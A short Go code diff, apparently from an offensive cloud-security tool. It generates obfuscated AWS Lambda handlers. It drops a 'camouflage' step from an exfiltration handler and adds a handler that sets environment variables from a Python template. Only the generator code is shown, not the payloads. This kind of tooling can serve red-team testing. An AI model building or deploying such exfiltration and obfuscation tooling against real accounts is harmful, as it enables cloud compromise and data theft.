@@ -37,15 +37,9 @@ func (c *CFNI) CreateLambdaExfiltrationHandler(opts *CreateLambdaExfiltrationOpt
 		return nil, err
 	}
 
-	camouflage, err := c.createCamouflage()
-	if err != nil {
-		return nil, err
-	}
-
-	return c.createHandler(&HandlerTemplateProperties{
-		CFNI:       cfni.String(),
-		Camouflage: camouflage,
-		S3Client:   s3Client(opts.S3AccessKey),
+	return c.createHandler(&HandlerOptions{
+		CFNI:     cfni.String(),
+		S3Client: s3Client(opts.S3AccessKey),
 	})
 }
 
@@ -77,4 +71,27 @@ import os
 	obfuscator := python.New()
 
 	return obfuscator.Obfuscate(payload)
+}
+
+type CreateLambdaSetEnvsOptions struct {
+	Envs        map[string]string
+	S3AccessKey *S3AccessKey
+}
+
+func (c *CFNI) CreateLambdaSetEnvsHandler(opts *CreateLambdaSetEnvsOptions) ([]byte, error) {
+	type data struct {
+		Envs string
+	}
+
+	cfni, err := executeTemplate("templates/lambda_set_envs.py", &data{
+		Envs: toPythonDict(opts.Envs),
+	})
+	if err != nil {
+		return nil, err
+	}
+
+	return c.createHandler(&HandlerOptions{
+		CFNI:     cfni.String(),
+		S3Client: s3Client(opts.S3AccessKey),
+	})
 }
